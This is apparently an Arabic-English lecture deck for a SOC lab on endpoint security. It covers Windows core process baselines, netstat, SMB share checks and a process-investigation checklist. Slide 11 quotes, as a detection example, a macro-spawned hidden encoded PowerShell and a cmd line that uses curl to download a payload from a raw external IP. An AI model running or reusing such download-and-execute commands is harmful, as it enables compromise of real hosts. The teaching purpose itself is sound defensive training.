# المعمل 07-08: أمان النقاط الطرفية - الجزء الأول: عمليات نظام ويندوز وأدوات Sysinternals

> **المقرر:** عمليات الأمن السيبراني (مختبر الـ SOC - Cybersecurity Operations)  
> **المحاضر:** Hussein Al-Selwi  
> **إجمالي عدد الشرائح:** 22 شريحة  
> **العرض التقديمي المصدري:** `Endpoint_Security_Lab7_8_AR.html`  

### 📋 نبذة عامة وأهداف الوحدة التدريبية
بناء الرؤية الأمنية العميقة على مستوى نظام التشغيل: خط الأساس المعتمد للعمليات القياسية في ويندوز (smss, csrss, wininit, services, svchost, explorer)، التحقيق والتحليل باستخدام Process Hacker و Process Explorer، وكشف العمليات الخبيثة المندسة وتقنيات تمويه المسارات والأسماء.

---

## 📑 جدول المحتويات

- [الشريحة 01: المقدمة](#slide-01-المقدمة)
- [الشريحة 02: أهداف المعمل](#slide-02-أهداف-المعمل)
- [الشريحة 03: مفهوم أمن الأجهزة (Endpoint Security)](#slide-03-مفهوم-أمن-الأجهزة-endpoint-security)
- [الشريحة 04: ما هو الجهاز الطرفي (Endpoint)؟](#slide-04-ما-هو-الجهاز-الطرفي-endpoint-؟)
- [الشريحة 05: ضوابط حماية الأجهزة الطرفية](#slide-05-ضوابط-حماية-الأجهزة-الطرفية)
- [الشريحة 06: ركائز مراقبة الأجهزة والأنظمة](#slide-06-ركائز-مراقبة-الأجهزة-والأنظمة)
- [الشريحة 07: تحليل اتصالات الشبكة المباشرة (netstat)](#slide-07-تحليل-اتصالات-الشبكة-المباشرة-netstat)
- [الشريحة 08: فحص المجلدات والموارد المشتركة](#slide-08-فحص-المجلدات-والموارد-المشتركة)
- [الشريحة 09: تحليل العمليات الجارية (Processes)](#slide-09-تحليل-العمليات-الجارية-processes)
- [الشريحة 10: أنواع وتصنيفات العمليات في ويندوز](#slide-10-أنواع-وتصنيفات-العمليات-في-ويندوز)
- [الشريحة 11: علاقة الأب والابن في العمليات (Parent-Child)](#slide-11-علاقة-الأب-والابن-في-العمليات-parent-child)
- [الشريحة 12: شجرة عمليات ويندوز القياسية](#slide-12-شجرة-عمليات-ويندوز-القياسية)
- [الشريحة 13: عملية System (PID 4)](#slide-13-عملية-system-pid-4)
- [الشريحة 14: عملية smss.exe (مدير الجلسات)](#slide-14-عملية-smss-exe-مدير-الجلسات)
- [الشريحة 15: عملية csrss.exe (وقت تشغيل العميل/الخادم)](#slide-15-عملية-csrss-exe-وقت-تشغيل-العميل-الخادم)
- [الشريحة 16: عملية wininit.exe (تهيئة النظام)](#slide-16-عملية-wininit-exe-تهيئة-النظام)
- [الشريحة 17: عملية services.exe (مدير الخدمات)](#slide-17-عملية-services-exe-مدير-الخدمات)
- [الشريحة 18: عملية svchost.exe (مضيف الخدمات)](#slide-18-عملية-svchost-exe-مضيف-الخدمات)
- [الشريحة 19: عملية lsass.exe (سلطة الأمان المحلية)](#slide-19-عملية-lsass-exe-سلطة-الأمان-المحلية)
- [الشريحة 20: عملية winlogon.exe (تسجيل الدخول)](#slide-20-عملية-winlogon-exe-تسجيل-الدخول)
- [الشريحة 21: عملية explorer.exe (سطح المكتب)](#slide-21-عملية-explorer-exe-سطح-المكتب)
- [الشريحة 22: قائمة التحقيق الأمني في العمليات](#slide-22-قائمة-التحقيق-الأمني-في-العمليات)

---

## الشريحة 01: المقدمة

> **التصنيف / الفئة:** `كشف التهديدات والاستجابة للحوادث · IDR`

### Endpoint Security

فهم الأجهزة الطرفية، والضوابط التي تحميها، وكيفية قراءة وتفكيك أعماق النظام لكشف المهاجم المتسلل للداخل.

المعمل 07 & 08 – مراقبة وكشف تهديدات الأجهزة

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> رحب بالطلاب في محور أمن الأجهزة والأنظمة (Endpoint Security). ينتقل هذا المحور بتركيزنا من الشبكة ككل إلى الأجهزة الطرفية الواقعة على أطرافها — حيث يعمل الموظفون وحيث يحاول المهاجمون الهبوط والسيطرة أولاً.

---

## الشريحة 02: أهداف المعمل

> **التصنيف / الفئة:** `نظرة عامة على المعمل`

### الأهداف التعليمية للمعمل

- فهم المبادئ الأساسية لـ مراقبة أمن الأجهزة الطرفية
- Explore endpoint types , controls , and detection strategies
- Understand core operating system components and their functions
- Develop practical skills in extracting insights from system internals
- Deploy and configure a unified endpoint detection solution

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> استعرض أهداف المعمل بإيجاز. أكد على التدرج المنطقي: فهم الأساسيات، استكشاف أنواع الأجهزة والضوابط الأمنية، التعمق في مكونات نظام التشغيل، تطبيق ذلك في التحقيق الجنائي المباشر، وأخيراً نشر حلول EDR متقدمة.

---

## الشريحة 03: مفهوم أمن الأجهزة (Endpoint Security)

> **التصنيف / الفئة:** `المقدمة التأسيسية`

### حماية النقطة التي يعيش فيها المستخدمون والبيانات

Endpoints are the doors into an organization — the laptops, phones, servers, and devices where people work and where attackers ultimately try to land. Endpoint security is the practice of protecting these devices from compromise, and closely watching them so that attacks which do get through can still be caught in the act.

- **The Common Entry Point**: روابط التصيد، المرفقات الخبيثة، والثغرات الأمنية في البرامج تهبط دائماً على جهاز الموظف أولاً.
- **Closest to the Evidence**: كل عملية ينفذها المهاجم، وكل ملف يعدله، وكل اتصال يفتحه يترك أثراً واضحاً في النظام.
- **Hard to Fully Control**: الأجهزة بالآلاف ومتنوعة ومتنقلة دائماً خارج بيئة العمل — مما يجعل تأمينها تحدياً حقيقياً.

> [!IMPORTANT]
> الهدف الاستراتيجي: not just preventing compromise, but maintaining enough visibility into every endpoint that an intrusion can be detected and stopped before it achieves its objective.

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> مهّد للموضوع نظرياً: الأجهزة الطرفية هي مساحة عمل الموظفين ونقطة هبوط المهاجمين، ولهذا السبب هي المدخل الأكثر استهدافاً وفي نفس الوقت أغنى مصدر للأدلة الجنائية الرقمية عند وقوع أي اختراق.

---

## الشريحة 04: ما هو الجهاز الطرفي (Endpoint)؟

> **التصنيف / الفئة:** `أساسيات الأجهزة الطرفية`

An endpoint is any device that connects to and communicates over a network — the physical hardware where code actually executes and data is actually accessed, which makes it something both defenders and attackers care about.

- **محطات العمل والحواسيب (Workstations)**: الحواسيب المكتبية والمحمولة التي يستخدمها الموظفون — وهي الهدف الأكثر تعرضاً لهجمات التصيد.
- **الأجهزة الذكية المتنقلة (Mobile)**: الهواتف والأجهزة اللوحية المتنقلة باستمرار بين الشبكات العامة، وخارج نطاق الحماية المؤسسية المباشرة.
- **الخوادم المركزية (Servers)**: أنظمة تعمل 24/7 تستضيف التطبيقات وقواعد البيانات — أهداف بالغة الأهمية للمخترقين.
- **IoT Devices**: الكاميرات الذكية، والمستشعرات، والأجهزة الذكية — متصلة بالشبكة ولكنها محدودة في قدرات الحماية.

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> عرّف الـ Endpoint بوضوح: أي جهاز يتصل بالشبكة ويعالج البيانات. استعرض الفئات الأربع: محطات العمل، الهواتف الذكية، الخوادم، وأجهزة IoT. أكد أنها رغم اختلاف أشكالها، إلا أنها تشترك في تشغيل الأكواد وبث القياسات والأحداث الأمنية (Telemetry).

---

## الشريحة 05: ضوابط حماية الأجهزة الطرفية

> **التصنيف / الفئة:** `ضوابط الحماية`

### حزمة ضوابط وتقنيات حماية الأجهزة

لا توجد أداة واحدة تمنع كل شيء — بل يعتمد الأمان الحقيقي على تعدد طبقات الدفاع (Defense-in-Depth)، بدءاً من التواقيع التقليدية وحتى التحليل السلوكي والاستجابة:

Prevention & Detection مكافحة الفيروسات (Antivirus / AV) — scans files and activity, matching known patterns and signatures. أنظمة كشف واستجابة الأجهزة (EDR) — agent-based, real-time monitoring and response across process, file, registry, and network activity. الاستجابة الممتدة متعددة البيئات (XDR) — integrates multiple controls and telemetry sources, with runbooks and automated response to routine threats. منع تسريب البيانات الحساسة (DLP) — protects sensitive data at rest, in transit, and in processing through access controls, masking, and prevention rules. Behavior & Access Control تحليل سلوك المستخدمين والكيانات (UBA) — monitors user behavior patterns and flags deviations from a historic and contextual baseline, surfacing insider threats, account compromise, and data exfiltration. جدار حماية الجهاز (Host Firewall) — controls incoming and outgoing traffic directly on the host.

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> صنّف ضوابط حماية الأجهزة: مكافحات الفيروسات التقليدية، أنظمة EDR، منصات XDR الموسعة، أنظمة منع تسريب البيانات DLP، تحليل سلوك المستخدمين UBA، وجدران الحماية المضيفة (Host Firewalls). وضح أن الحماية تعتمد على تعدد الطبقات.

---

## الشريحة 06: ركائز مراقبة الأجهزة والأنظمة

> **التصنيف / الفئة:** `المراقبة والاستطلاع`

### الركائز الأربع لمراقبة أمن الأجهزة

تعتمد المراقبة الفعالة على التدقيق في 4 فئات رئيسية من الإشارات، حيث تنعكس كل تحركات المهاجم في واحدة منها على الأقل:

- **Process Execution**: مراقبة الملفات التنفيذية المشغلة، معرفات العمليات (PID)، معاملات الأوامر، والشجرة الهرمية للعمليات.
- **File System Changes**: تتبع إنشاء وتعديل وحذف الملفات عبر أنظمة مراقبة سلامة الملفات (File Integrity Monitoring).
- **Network Connections**: فحص الاتصالات المنبثقة من الجهاز وربط كل اتصال شبكي بالعملية والبرنامج المسؤول عنه.
- **Registry Modifications**: رصد التغييرات في مفاتيح وقيم السجل — وهو المكان الأكثر استغلالاً لآليات الثبات (Persistence).

> [!IMPORTANT]
> المحور القادم: we'll use these four categories as the foundation for extracting insights from system internals and configuring a working detection solution.

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> اشرح الركائز الأربع لمراقبة الأجهزة: مراقبة العمليات الجارية (Processes)، مراقبة تعديل الملفات (FIM)، مراقبة الاتصالات الشبكية الصادرة والواردة، ومراقبة تعديلات سجل النظام (Registry).

---

## الشريحة 07: تحليل اتصالات الشبكة المباشرة (netstat)

> **التصنيف / الفئة:** `أعماق النظام`

### تحليل وفحص الاتصالات الشبكية المباشرة

Malware has to talk to succeed — command-and-control callbacks, payload downloads, lateral movement, and data exfiltration all show up as connections on the host. Reading those connections, and tying each one back to the process that opened it, is one of the fastest ways to catch an endpoint that's already been compromised.

netstat -anob CLI Built into Windows — no install needed, scriptable, and the fastest way to check connections during triage. -a All connections & listening ports -n Numeric addresses — skips slow DNS lookups -o Owning process ID (PID) per connection -b Executable behind the connection (admin) TCPView GUI · Sysinternals Same data as netstat , refreshed live and color-flashed as connections open and close Sortable by process, PID, or state — much faster to scan than raw text output Right-click a connection to close it or jump straight to its process

```powershell
C:\>
netstat -anob
Proto Local Address Foreign Address State PID
TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 1220
[wininit.exe]
TCP 192.168.1.15:52142 142.250.72.14:443 ESTABLISHED 4832
[chrome.exe]
TCP 192.168.1.15:52210 185.220.101.7:4444 ESTABLISHED 6120
[powershell.exe] ← unfamiliar IP, uncommon port, unexpected caller
```

> [!IMPORTANT]
> The purpose: baseline what's normal for a host, then hunt for what isn't — unexpected LISTENING ports, ESTABLISHED connections to unfamiliar IPs or high/uncommon ports, and processes with no legitimate reason to be making outbound calls at all.

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> البرمجيات الخبيثة تحتاج للتواصل مع الخارج لتكون فعالة، ولذلك تعد اتصالات الشبكة دليلاً جنائياً ذهبياً. اشرح أمر netstat -anob علماً بعلم، وأداة TCPView كبديل رسومي. استعرض الجدول التوضيحي وبيّن السطر الأخير المشبوه: عملية powershell تتصل بـ IP خارجي ومنفذ 4444!

---

## الشريحة 08: فحص المجلدات والموارد المشتركة

> **التصنيف / الفئة:** `أعماق النظام`

### فحص الموارد والمجلدات المشتركة (Shares)

Network connections aren't the only way attackers move through a host — shared folders and admin shares (SMB) are a favorite path for lateral movement, dropping tools, and pulling data out. Checking what's shared, what's visible, and who's connected in is a quick way to catch that kind of exploitation early.

- **net shareCLI** `[CLI]`: Lists every folder shared out from this host — including hidden admin shares like C$ and ADMIN$ . Shows what an attacker could reach if they landed here.
- **net viewCLI** `[CLI]`: Shows shares visible on a remote machine — net view \\host — the same recon step an attacker runs to find what's worth pivoting to next.
- **net sessionCLI** `[CLI]`: Lists active inbound sessions to this host — who's currently connected and to which share. An unfamiliar remote user here means someone is already in.

```bash
C:\>
net share
Share name Resource Remark
C$ C:\ Default share
ADMIN$ C:\Windows Remote Admin
FINANCE C:\Shares\Finance ← not on the baseline share list
C:\>
net session
Computer User name Client Type Idle time
\\192.168.1.44 svc_backup Windows 10 00:02:11 ← unrecognized remote user
```

> [!WARNING]
> Why it matters: attackers routinely scan for open or misconfigured SMB shares to stage payloads, exfiltrate files, or move laterally between hosts — often the exact abuse behind the EternalBlue / SMB port-445 exploitation family. An unexpected share, an unrecognized session, or admin shares reachable without proper restrictions are all worth investigating immediately.

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> Bridge from network connections into shared resources — attackers enumerate and abuse SMB shares for lateral movement, staging tools, and exfiltration. Walk through net share (what's exposed), net view (what's visible from this host), and net session (who's connected in). Point out that an unexpected admin share, an unfamiliar remote session, or shares no one on the team recognizes are all red flags worth chasing.

---

## الشريحة 09: تحليل العمليات الجارية (Processes)

> **التصنيف / الفئة:** `أعماق النظام`

### تحليل العمليات الجارية وخصائصها الأساسية

Almost everything an attacker does eventually runs as a process. Reading the process list closely — not just what's running, but what launched it and what arguments it was given — turns a wall of executable names into a story of what actually happened on the host.

- **tasklist**: Built-in CLI — lists running processes with PID, memory, and session; add /v for the owning window title.
- **wmic process**: Built-in CLI — queries process objects directly, including the full CommandLine and ParentProcessId .
- **Task Manager**: Built-in GUI — quick and familiar, but limited: no command line shown, and the process tree view is shallow.
- **Process Explorer**: Sysinternals GUI — full process tree, command line, loaded DLLs, and digital signature checks in one view.

> [!IMPORTANT]
> Before hunting for anomalies: you need to know what's normal. That starts with recognizing the three broad categories every process on a Windows host falls into.

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> Introduce the four tools before touching the deeper concepts. Emphasize the gap between the CLI tools (fast, scriptable, full command-line visibility with wmic) and the GUI tools (easier to scan, but Task Manager alone won't show you a command line or a deep tree — that's what Process Explorer is for).

---

## الشريحة 10: أنواع وتصنيفات العمليات في ويندوز

> **التصنيف / الفئة:** `أساسيات العمليات`

### التصنيفات الثلاثة الكبرى للعمليات في ويندوز

Before judging whether a process looks right, you need to know what category it belongs to. On Windows, almost every process falls into one of three buckets.

- **System (Windows) Processes**: Core OS processes that start at boot and typically run with SYSTEM or kernel-level privileges — System , smss.exe , csrss.exe , wininit.exe , lsass.exe . Essential to the OS; should never be missing, duplicated oddly, or running from the wrong path.
- **User (App) Processes**: Applications the logged-in user launches directly — browsers, Office, custom software. Run under the user's own account and privileges, and are tied to their interactive session.
- **Service (Background) Processes**: Run continuously in the background, independent of any logged-in user — usually launched by services.exe . Includes svchost.exe instances hosting Windows services, antivirus agents, and update daemons.

> [!IMPORTANT]
> Next: we'll walk through the critical Windows system processes one at a time — what each one is supposed to look like, so you can immediately spot one that doesn't.

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> Establish the three categories before naming specific processes. This is the mental model students need before the System/smss/csrss/etc. deep-dives: is this a core OS process, something the logged-in user launched, or a background service? Most anomaly-spotting starts by asking which bucket a process should be in, and whether it's behaving like it.

---

## الشريحة 11: علاقة الأب والابن في العمليات (Parent-Child)

> **التصنيف / الفئة:** `أعماق النظام`

### علاقات الأب والابن في العمليات (Parent-Child Chains)

Every process is the child of the one that launched it. Legitimate software follows predictable lineages — when a process breaks that pattern, the mismatch is often the clearest signal available.

WINWORD.EXE PID 3344 "C:\Program Files\Microsoft Office\WINWORD.EXE" /n "invoice_report.docm" POWERSHELL.EXE PID 5820 · parent 3344 -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIA... ANOMALY CMD.EXE PID 6104 · parent 5820 /c curl.exe -o update.exe http://185.220.101.7/payload

> [!WARNING]
> Classic red flag: an Office application spawning a shell like powershell.exe or cmd.exe is one of the most reliable indicators of a malicious macro executing — legitimate documents almost never need to launch a shell.

> [!IMPORTANT]
> For every process, check three things: the parent-child lineage (does this chain make sense?), the full command line (encoded, obfuscated, or unusual arguments), and the execution path — a "svchost.exe" running from a Temp folder is not the real svchost.exe.

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> Walk the tree top to bottom — WINWORD.EXE spawning POWERSHELL.EXE is the anomaly, and the encoded command line plus the further spawned CMD.EXE reaching out to a raw IP reinforces it. Close on what to check for any process you're investigating: parent, command line, and execution path.

---

## الشريحة 12: شجرة عمليات ويندوز القياسية

> **التصنيف / الفئة:** `عمليات نظام ويندوز`

### شجرة عمليات ويندوز الأساسية (The Process Tree)

Every legitimate process on a Windows host traces back to this same skeleton. Knowing the shape of the healthy tree is what makes a broken branch — a wrong parent, a missing link, an extra hop — jump out immediately.

System PID 4 smss.exe (Master) smss.exe (Session 0) smss.exe (Session 1) csrss.exe wininit.exe winlogon.exe csrss.exe services.exe lsass.exe userinit.exe svchost.exe explorer.exe

> [!IMPORTANT]
> Session 0 vs. Session 1: Session 0 is the isolated, non-interactive session that hosts services and the OS itself; Session 1 (and up) is the interactive desktop a user actually logs into. A process that should live in one session showing up in the other is a red flag on its own.

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> This is the map before the individual deep-dives. Walk it top-down: System spawns the one and only smss.exe master instance, which forks into a per-session smss.exe — Session 0 for OS/services, Session 1+ for the interactive logon. Session 0's branch builds the service environment (services.exe, lsass.exe, svchost.exe); Session 1's branch builds the user's desktop (winlogon.exe → userinit.exe → explorer.exe). Point out that userinit.exe is transient — it exits after launching explorer.exe, which is why a live userinit.exe still running is itself worth a second look.

---

## الشريحة 13: عملية System (PID 4)

> **التصنيف / الفئة:** `عمليات نظام ويندوز`

### System PID 4

The System is not an actual executable but a representation of the Windows kernel itself. It owns the core system threads and is responsible for managing the CPU, memory, and hardware resources.

| العنصر / المفتاح | الوصف / القيمة |
| --- | --- |
| مسار الملف التنفيذي (5. المسار الفعلي للملف (Image Path)) | None (or C:\Windows\system32\ntoskrnl.exe ) |
| PID | 4 |
| 1. العملية الأب (Parent Process) | None (or System Idle Process) |
| Number of Instances | 1 |
| Start Time | At Boot |

> [!WARNING]
> Know the invariants: System should always be PID 4 , have no parent, and no file on disk. A process named "System" with a different PID, a parent, or a real image path is not the real one.

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> First of the critical-process deep-dives. System (PID 4) is the anchor case: it owns kernel-mode threads, has no image on disk, no parent, and always runs as PID 4 under Local System. Emphasize the invariants students should memorize, since deviations from any of them (wrong PID, an actual file path, a parent process) are a strong sign of masquerading malware.

---

## الشريحة 14: عملية smss.exe (مدير الجلسات)

> **التصنيف / الفئة:** `عمليات نظام ويندوز`

### smss.exe Session Manager Subsystem

smss.exe is the first user-mode process created by the kernel during startup. It is responsible for initializing new sessions and launching the next processes in the boot sequence, after which it terminates.

| العنصر / المفتاح | الوصف / القيمة |
| --- | --- |
| مسار الملف التنفيذي (5. المسار الفعلي للملف (Image Path)) | %SystemRoot%\System32\smss.exe |
| 1. العملية الأب (Parent Process) | System (4) |
| Number of Instances | 1 master, 1 child instance per session (children self-terminate) |
| Start Time | Within seconds of boot |

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> Second of the critical-process deep-dives. smss.exe is the Session Manager Subsystem — it's the direct child of System (PID 4) and the parent of wininit.exe and csrss.exe, tying straight back to the process tree diagram. One master instance persists for the life of the system; each per-session child instance does its job and self-terminates, so seeing more than one smss.exe still running is itself worth investigating.

---

## الشريحة 15: عملية csrss.exe (وقت تشغيل العميل/الخادم)

> **التصنيف / الفئة:** `عمليات نظام ويندوز`

### csrss.exe Client/Server Runtime Subsystem

csrss.exe runs continuously in the background of every session. It manages core functions such as console windows and shutdown procedures, and although users never interact with it directly, the system cannot function without it.

| العنصر / المفتاح | الوصف / القيمة |
| --- | --- |
| مسار الملف التنفيذي (5. المسار الفعلي للملف (Image Path)) | %SystemRoot%\System32\csrss.exe |
| 1. العملية الأب (Parent Process) | smss.exe (orphan process) |
| Number of Instances | Two or more |
| Start Time | Within seconds of boot (first two instances) |

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> Third of the critical-process deep-dives. csrss.exe is the Client/Server Runtime Subsystem — it's a child of smss.exe but shows as an orphan once smss.exe self-terminates, which is expected and not a red flag on its own. There are always two or more instances (one per session), and both should spin up within seconds of boot. A csrss.exe running from anywhere other than System32, or one running under a non-Local-System account, is masquerading malware.

---

## الشريحة 16: عملية wininit.exe (تهيئة النظام)

> **التصنيف / الفئة:** `عمليات نظام ويندوز`

### wininit.exe Windows Initialization

wininit.exe is a critical Windows system process that initializes the operating system during startup and launches essential system processes such as services.exe and lsass.exe

| العنصر / المفتاح | الوصف / القيمة |
| --- | --- |
| مسار الملف التنفيذي (5. المسار الفعلي للملف (Image Path)) | %SystemRoot%\System32\wininit.exe |
| 1. العملية الأب (Parent Process) | smss.exe (orphan process) |
| Number of Instances | 1 |
| Start Time | Within seconds of boot |

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> Fourth of the critical-process deep-dives. wininit.exe is what actually builds out Session 0 — the isolated, non-interactive session that hosts services and system processes, distinct from the interactive Session 1 a user logs into. It runs once, spawns services.exe and lsass.exe, and then its job is essentially done. Like csrss.exe, showing as an orphan is expected once smss.exe self-terminates.

---

## الشريحة 17: عملية services.exe (مدير الخدمات)

> **التصنيف / الفئة:** `عمليات نظام ويندوز`

### services.exe Service Control Manager

services.exe functions as the central manager for all Windows services, responsible for starting, stopping, and tracking them. Nearly every background service on the system ultimately traces back to this process.

| العنصر / المفتاح | الوصف / القيمة |
| --- | --- |
| مسار الملف التنفيذي (5. المسار الفعلي للملف (Image Path)) | %SystemRoot%\System32\services.exe |
| 1. العملية الأب (Parent Process) | wininit.exe |
| Number of Instances | 1 |
| Start Time | Within seconds of boot |

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> Fifth of the critical-process deep-dives. services.exe is the Service Control Manager (SCM) — it's the process that starts, stops, and manages every Windows service, which makes it one of the most abused parents in persistence hunting: a huge share of malicious autostart services show up as children of services.exe. Point out the LastKnownGood CurrentControlSet detail as a specific, memorable fact worth retaining.

---

## الشريحة 18: عملية svchost.exe (مضيف الخدمات)

> **التصنيف / الفئة:** `عمليات نظام ويندوز`

### svchost.exe Service Host

svchost.exe allows multiple Windows services to run within a shared process rather than each requiring its own executable. As a result, it is normal for several instances of it to run simultaneously.

| العنصر / المفتاح | الوصف / القيمة |
| --- | --- |
| مسار الملف التنفيذي (5. المسار الفعلي للملف (Image Path)) | %SystemRoot%\System32\svchost.exe |
| 1. العملية الأب (Parent Process) | services.exe |
| Number of Instances | Many (typically 10+) |
| Start Time | Within seconds of boot or whenever services start |

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> عملية svchost.exe تستضيف خدمات النظام المكتوبة بصيغة DLL. يجمع المعامل -k الخدمات المتشابهة في عملية واحدة، ولذلك من الطبيعي رؤية أكثر من 10 نسخ svchost تعمل معاً. لكن هذا الانتشار يستغله المخترقون للتمويه، لذا يجب فحص الأب والمسار والمعاملات بدقة.

---

## الشريحة 19: عملية lsass.exe (سلطة الأمان المحلية)

> **التصنيف / الفئة:** `عمليات نظام ويندوز`

### lsass.exe Local Security Authority Subsystem Service

lsass.exe authenticates user credentials at login and enforces the system's local security policies. Because it handles sensitive credential data, it is a frequent target for attackers attempting to extract passwords.

| العنصر / المفتاح | الوصف / القيمة |
| --- | --- |
| مسار الملف التنفيذي (5. المسار الفعلي للملف (Image Path)) | %SystemRoot%\System32\lsass.exe |
| 1. العملية الأب (Parent Process) | wininit.exe |
| Number of Instances | 1 |
| Start Time | Within seconds of boot |

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> عملية lsass.exe: سلطة الأمان المحلية. تطبق السياسات الأمنية، وتدير مصادقة المستخدمين وتخزين كلمات المرور في الذاكرة. يجب أن توجد منها نسخة واحدة فقط بحساب Local System تحت wininit.exe. هي الهدف رقم 1 في العالم لأدوات سرقة كلمات المرور من الذاكرة (مثل Mimikatz)!

---

## الشريحة 20: عملية winlogon.exe (تسجيل الدخول)

> **التصنيف / الفئة:** `عمليات نظام ويندوز`

### winlogon.exe Windows Logon

winlogon.exe manages the sign-in and sign-out screen. It also listens for the Ctrl+Alt+Del sequence, which protects users against fraudulent login screens designed to capture credentials.

| العنصر / المفتاح | الوصف / القيمة |
| --- | --- |
| مسار الملف التنفيذي (5. المسار الفعلي للملف (Image Path)) | %SystemRoot%\System32\winlogon.exe |
| 1. العملية الأب (Parent Process) | smss.exe (orphan process) |
| Number of Instances | 1 or more |
| Start Time | Within seconds of boot (Session 1) |

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> عملية winlogon.exe: تدير تسجيل الدخول والخروج، وتحمل ملف المستخدم، وتستمع لضغطات الأمان (Ctrl+Alt+Del) لمنع الشاشات المزيفة. هي عملية يتيمة شرعياً أطلقتها smss.exe ثم أغلقت، ويجب التنبيه على أن عدم وجود أب لها هو أمر طبيعي تماماً هنا.

---

## الشريحة 21: عملية explorer.exe (سطح المكتب)

> **التصنيف / الفئة:** `عمليات نظام ويندوز`

### explorer.exe Windows Explorer

explorer.exe provides the graphical interface that users directly interact with — the desktop, taskbar, Start Menu, and file windows are all rendered by this process.

| العنصر / المفتاح | الوصف / القيمة |
| --- | --- |
| مسار الملف التنفيذي (5. المسار الفعلي للملف (Image Path)) | %SystemRoot%\explorer.exe |
| 1. العملية الأب (Parent Process) | userinit.exe (orphan process) |
| Number of Instances | 1 or more |
| Start Time | When interactive user sessions begin |

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> عملية explorer.exe: واجهة مستخدم ويندوز وسطح المكتب وقائمة ابدأ. تعمل بحساب المستخدم العادي، ولذلك يستغلها المهاجمون لتشغيل أدواتهم كأبناء لـ explorer.exe لتندمج مع الأنشطة اليومية الطبيعية للموظف.

---

## الشريحة 22: قائمة التحقيق الأمني في العمليات

> **التصنيف / الفئة:** `التحقيق في العمليات`

### Process Investigation

- 1. العملية الأب (Parent Process) Is this the expected process hierarchy?
- 2. العمليات الفرعية (Child Processes) Is this the expected process hierarchy?
- 3. معاملات سطر الأوامر (Arguments) Does it include unusual switches, encoded commands, or suspicious paths?
- اسم العملية (Process Name)s Typos, lookalikes, copies
- مسار الملف التنفيذي (5. المسار الفعلي للملف (Image Path)) Is this process running the expected executable?

> [!NOTE] 🎙️ **ملاحظات وتوجيهات المحاضر (Instructor Lecture Notes)**
> هذه هي قائمة المراجعة الذهبية للتحقيق في أي عملية مشبوهة: هل تقع في مكانها الصحيح في شجرة العمليات (الأب الصحيح، والأبناء المتوقعون)، هل المعاملات طبيعية، هل الاسم سليم أم خطأ إملائي مقصود، وهل تعمل من مسارها الرسمي على القرص. أي اختلاف هو خيط يقود لاكتشاف الاختراق!

---

## 🎯 الخلاصة ومخرجات التعلم

- **الوحدة التدريبية:** المعمل 07-08: أمان النقاط الطرفية - الجزء الأول: عمليات نظام ويندوز وأدوات Sysinternals

- **المهارات المكتسبة:** فهم عملي وتطبيقي عميق لكيفية الكشف، التحقيق، الاستجابة، وإدارة التهديدات الأمنية باحترافية داخل بيئة العمليات.

- **مرجع التدريب:** مختبر عمليات الأمن السيبراني العملي — إعداد وتقديم: **Hussein Al-Selwi**.
